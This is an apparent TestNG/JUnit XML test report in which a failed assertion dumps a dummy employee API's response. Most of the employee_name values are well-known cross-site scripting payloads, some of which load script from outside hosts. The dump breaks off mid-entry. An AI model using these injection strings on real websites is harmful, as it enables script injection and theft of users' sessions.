<?xml version="1.0" encoding="UTF-8"?>
<!-- Generated by org.testng.reporters.JUnitReportReporter -->
<testsuite hostname="IM-LP-115" failures="1" tests="2" name="com.BDD.Tests.validateSingleandMultipleContents" time="9.652" errors="0" timestamp="2019-09-22T18:33:07 IST" skipped="0">
  <testcase classname="com.BDD.Tests.validateSingleandMultipleContents" name="testMutipleContent" time="6.986">
    <failure message="1 expectation failed.
XML path employee_salary doesn&#039;t match.
Expected: (a collection containing &quot;123&quot; and a collection containing &quot;1124&quot;)
  Actual: &lt;\/SCRIPT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;56995&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;javascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;56996&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=javascript:alert(&#039;XSS&#039;)&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;56998&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;56999&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=`javascript:alert(\&quot;RSnake says, &#039;XSS&#039;\&quot;)`&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57000&quot;,&quot;employee_name&quot;:&quot;&lt;IMG \&quot;\&quot;\&quot;&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;)&lt;\/SCRIPT&gt;\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57002&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57003&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57004&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57005&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57006&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;jav\tascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57007&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;jav&amp;#x09;ascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57008&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;jav&amp;#x0A;ascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57009&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;jav&amp;#x0D;ascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57010&quot;,&quot;employee_name&quot;:&quot;perl -e &#039;print \&quot;&lt;IMG SRC=java\\0script:alert(\\\&quot;XSS\\\&quot;)&gt;\&quot;;&#039; &gt; out&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57011&quot;,&quot;employee_name&quot;:&quot;perl -e &#039;print \&quot;&lt;SCR\\0IPT&gt;alert(\\\&quot;XSS\\\&quot;)&lt;\/SCR\\0IPT&gt;\&quot;;&#039; &gt; out&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57012&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot; &amp;#14;  javascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57013&quot;,&quot;employee_name&quot;:&quot;&lt;SCRIPT\/XSS SRC=\&quot;http:\/\/soapui.org\/xss.js\&quot;&gt;&lt;\/SCRIPT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57014&quot;,&quot;employee_name&quot;:&quot;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[\/|\\]^`=alert(\&quot;XSS\&quot;)&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57015&quot;,&quot;employee_name&quot;:&quot;&lt;SCRIPT\/SRC=\&quot;http:\/\/soapui.org\/xss.js\&quot;&gt;&lt;\/SCRIPT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57016&quot;,&quot;employee_name&quot;:&quot;&lt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;);\/\/&lt;&lt;\/SCRIPT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57017&quot;,&quot;employee_name&quot;:&quot;&lt;SCRIPT SRC=http:\/\/soapui.org\/xss.js?&lt;B&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57018&quot;,&quot;employee_name&quot;:&quot;&lt;SCRIPT SRC=\/\/ha.ckers.org\/.j&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57019&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;javascript:alert(&#039;XSS&#039;)\&quot;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57020&quot;,&quot;employee_name&quot;:&quot;&lt;iframe src=http:\/\/soapui.org\/scriptlet.html &lt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57021&quot;,&quot;employee_name&quot;:&quot;&lt;SCRIPT&gt;a=\/XSS\/alert(a.source)&lt;\/SCRIPT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57022&quot;,&quot;employee_name&quot;:&quot;\\\&quot;;alert(&#039;XSS&#039;);\/\/&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57023&quot;,&quot;employee_name&quot;:&quot;&lt;\/TITLE&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;);&lt;\/SCRIPT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57024&quot;,&quot;employee_name&quot;:&quot;&lt;INPUT TYPE=\&quot;IMAGE\&quot; SRC=\&quot;javascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57025&quot;,&quot;employee_name&quot;:&quot;&lt;BODY BACKGROUND=\&quot;javascript:alert(&#039;XSS&#039;)\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57026&quot;,&quot;employee_name&quot;:&quot;&lt;BODY ONLOAD=alert(&#039;XSS&#039;)&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57027&quot;,&quot;employee_name&quot;:&quot;&lt;IMG DYNSRC=\&quot;javascript:alert(&#039;XSS&#039;)\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57028&quot;,&quot;employee_name&quot;:&quot;&lt;IMG LOWSRC=\&quot;javascript:alert(&#039;XSS&#039;)\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57029&quot;,&quot;employee_name&quot;:&quot;&lt;BGSOUND SRC=\&quot;javascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57030&quot;,&quot;employee_name&quot;:&quot;&lt;BR SIZE=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57031&quot;,&quot;employee_name&quot;:&quot;&lt;LAYER SRC=\&quot;http:\/\/soapui.org\/scriptlet.html\&quot;&gt;&lt;\/LAYER&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57032&quot;,&quot;employee_name&quot;:&quot;&lt;LINK REL=\&quot;stylesheet\&quot; HREF=\&quot;javascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57033&quot;,&quot;employee_name&quot;:&quot;&lt;LINK REL=\&quot;stylesheet\&quot; HREF=\&quot;http:\/\/soapui.org\/xss.css\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57034&quot;,&quot;employee_name&quot;:&quot;&lt;STYLE&gt;@import&#039;http:\/\/soapui.org\/xss.css&#039;;&lt;\/STYLE&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57035&quot;,&quot;employee_name&quot;:&quot;&lt;META HTTP-EQUIV=\&quot;Link\&quot; Content=\&quot;&lt;http:\/\/soapui.org\/xss.css&gt;; REL=stylesheet\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57036&quot;,&quot;employee_name&quot;:&quot;&lt;STYLE&gt;BODY{-moz-binding:url(\&quot;http:\/\/soapui.org\/xssmoz.xml#xss\&quot;)}&lt;\/STYLE&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57037&quot;,&quot;employee_name&quot;:&quot;&lt;XSS STYLE=\&quot;behavior: url(xss.htc);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57038&quot;,&quot;employee_name&quot;:&quot;&lt;STYLE&gt;li {list-style-image: url(\&quot;javascript:alert(&#039;XSS&#039;)\&quot;);}&lt;\/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57039&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=&#039;vbscript:msgbox(\&quot;XSS\&quot;)&#039;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57040&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;mocha:[code]\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57041&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;livescript:[code]\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57042&quot;,&quot;employee_name&quot;:&quot;?script?alert(?XSS?)?\/script?&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57043&quot;,&quot;employee_name&quot;:&quot;&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57044&quot;,&quot;employee_name&quot;:&quot;&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=data:text\/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3Njcmlw&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57045&quot;,&quot;employee_name&quot;:&quot;&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0; URL=http:\/\/;URL=javascript:alert(&#039;XSS&#039;);\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57046&quot;,&quot;employee_name&quot;:&quot;&lt;IFRAME SRC=\&quot;javascript:alert(&#039;XSS&#039;);\&quot;&gt;&lt;\/IFRAME&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57047&quot;,&quot;employee_name&quot;:&quot;&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#039;XSS&#039;);\&quot;&gt;&lt;\/FRAMESET&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57048&quot;,&quot;employee_name&quot;:&quot;&lt;TABLE BACKGROUND=\&quot;javascript:alert(&#039;XSS&#039;)\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57049&quot;,&quot;employee_name&quot;:&quot;&lt;TABLE&gt;&lt;TD BACKGROUND=\&quot;javascript:alert(&#039;XSS&#039;)\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57050&quot;,&quot;employee_name&quot;:&quot;&lt;DIV STYLE=\&quot;background-image: url(javascript:alert(&#039;XSS&#039;))\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57051&quot;,&quot;employee_name&quot;:&quot;&lt;DIV STYLE=\&quot;background-image:\\0075\\0072\\006C\\0028&#039;\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57052&quot;,&quot;employee_name&quot;:&quot;&lt;DIV STYLE=\&quot;background-image: url(&amp;#1;javascript:alert(&#039;XSS&#039;))\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57053&quot;,&quot;employee_name&quot;:&quot;&lt;DIV STYLE=\&quot;width: expression(alert(&#039;XSS&#039;));\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57054&quot;,&quot;employee_name&quot;:&quot;&lt;STYLE&gt;@im\\port&#039;\\ja\\vasc\\ript:alert(\&quot;XSS\&quot;)&#039;;&lt;\/STYLE&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57055&quot;,&quot;employee_name&quot;:&quot;&lt;IMG STYLE=\&quot;xss:expr\/*XSS*\/ession(alert(&#039;XSS&#039;))\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57056&quot;,&quot;employee_name&quot;:&quot;&lt;XSS STYLE=\&quot;xss:expression(alert(&#039;XSS&#039;))\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57057&quot;,&quot;employee_name&quot;:&quot;exp\/*&lt;A STYLE=&#039;no\\xss:noxss(\&quot;*\/\/*\&quot;);xss:&amp;#101;x&amp;#x2F;*XSS*\/\/*\/*\/pression(alert(\&quot;XSS\&quot;))&#039;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57058&quot;,&quot;employee_name&quot;:&quot;&lt;STYLE TYPE=\&quot;text\/javascript\&quot;&gt;alert(&#039;XSS&#039;);&lt;\/STYLE&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57059&quot;,&quot;employee_name&quot;:&quot;&lt;STYLE&gt;.XSS{background-image:url(\&quot;javascript:alert(&#039;XSS&#039;)\&quot;);}&lt;\/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;\/A&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57060&quot;,&quot;employee_name&quot;:&quot;&lt;STYLE type=\&quot;text\/css\&quot;&gt;BODY{background:url(\&quot;javascript:alert(&#039;XSS&#039;)\&quot;)}&lt;\/STYLE&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57061&quot;,&quot;employee_name&quot;:&quot;&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;alert(&#039;XSS&#039;);&lt;\/SCRIPT&gt;&lt;![endif]--&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57062&quot;,&quot;employee_name&quot;:&quot;&lt;BASE HREF=\&quot;javascript:alert(&#039;XSS&#039;);\/\/\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57063&quot;,&quot;employee_name&quot;:&quot;&lt;OBJECT TYPE=\&quot;text\/x-scriptlet\&quot; DATA=\&quot;http:\/\/soapui.org\/scriptlet.html\&quot;&gt;&lt;\/OBJECT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57064&quot;,&quot;employee_name&quot;:&quot;&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&#039;X&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57065&quot;,&quot;employee_name&quot;:&quot;&lt;EMBED SRC=\&quot;http:\/\/soapui.org\/xss.swf\&quot; AllowScriptAccess=\&quot;always\&quot;&gt;&lt;\/EMBED&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57066&quot;,&quot;employee_name&quot;:&quot;&lt;EMBED SRC=\&quot;data:image\/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4b&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57067&quot;,&quot;employee_name&quot;:&quot;a=\&quot;get\&quot;;b=\&quot;URL(\\\&quot;\&quot;;c=\&quot;javascript:\&quot;;d=\&quot;alert(&#039;XSS&#039;);\\\&quot;)\&quot;;eval(a+b+c+d);&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57068&quot;,&quot;employee_name&quot;:&quot;&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=\&quot;javas]]&gt;&lt;![CDATA[cript:alert(&#039;XSS&#039;);\&quot;&gt;]]&gt;&lt;\/C&gt;&lt;\/X&gt;&lt;\/xml&gt;&lt;SPAN DATA&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57069&quot;,&quot;employee_name&quot;:&quot;&lt;XML ID=\&quot;xss\&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\&quot;javas&lt;!-- --&gt;cript:alert(&#039;XSS&#039;)\&quot;&amp;gt;&lt;\/B&gt;&lt;\/I&gt;&lt;\/XML&gt;&lt;SPAN DATASRC=\&quot;#xss\&quot;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57070&quot;,&quot;employee_name&quot;:&quot;&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix=\&quot;t\&quot; ns=\&quot;urn:schemas-microsoft-com:time\&quot;&gt;&lt;?import namespace=\&quot;t\&quot; im&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57071&quot;,&quot;employee_name&quot;:&quot;&lt;SCRIPT SRC=\&quot;http:\/\/soapui.org\/xss.jpg\&quot;&gt;&lt;\/SCRIPT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57072&quot;,&quot;employee_name&quot;:&quot;&lt;? echo(&#039;&lt;SCR)&#039;;echo(&#039;IPT&gt;alert(\&quot;XSS\&quot;)&lt;\/SCRIPT&gt;&#039;); ?&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57073&quot;,&quot;employee_name&quot;:&quot;&lt;IMG SRC=\&quot;http:\/\/soapui.org\/somecommand.php?somevariables=maliciouscode\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57074&quot;,&quot;employee_name&quot;:&quot;Redirect 302 \/a.jpg http:\/\/soapui.org\/admin.asp&amp;deleteuser&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57075&quot;,&quot;employee_name&quot;:&quot;&lt;META HTTP-EQUIV=\&quot;Set-Cookie\&quot; Content=\&quot;USERID=&lt;SCRIPT&amp;gt;alert(&#039;XSS&#039;)&lt;\/SCRIPT&amp;gt;\&quot;&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57076&quot;,&quot;employee_name&quot;:&quot;&lt;HEAD&gt;&lt;META HTTP-EQUIV=\&quot;CONTENT-TYPE\&quot; CONTENT=\&quot;text\/html; charset=UTF-7\&quot;&gt; &lt;\/HEAD&gt;+ADw-SCRIPT+AD4-ale&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57077&quot;,&quot;employee_name&quot;:&quot;&lt;SCRIPT a=\&quot;&gt;\&quot; SRC=\&quot;http:\/\/soapui.org\/xss.js\&quot;&gt;&lt;\/SCRIPT&gt;&quot;,&quot;employee_salary&quot;:&quot;1124&quot;,&quot;employee_age&quot;:&quot;24&quot;,&quot;profile_image&quot;:&quot;&quot;},{&quot;id&quot;:&quot;57078&quot;,&quot;employee_name&quot;:&quot;&lt;SCRIPT =\&quot;&gt;\&quot; 